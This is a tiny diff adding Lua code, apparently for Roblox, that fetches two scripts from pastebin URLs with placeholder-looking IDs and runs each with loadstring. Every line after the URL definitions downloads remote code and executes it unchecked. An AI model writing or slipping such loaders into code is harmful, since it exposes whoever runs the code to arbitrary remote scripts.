@@ -1,0 +1,5 @@
+local url1 = "https://pastebin.com/raw/ABC123"
+local url2 = "https://pastebin.com/raw/DEF456"
+
+loadstring(game:HttpGet(url1))()
+loadstring(game:HttpGet(url2))()
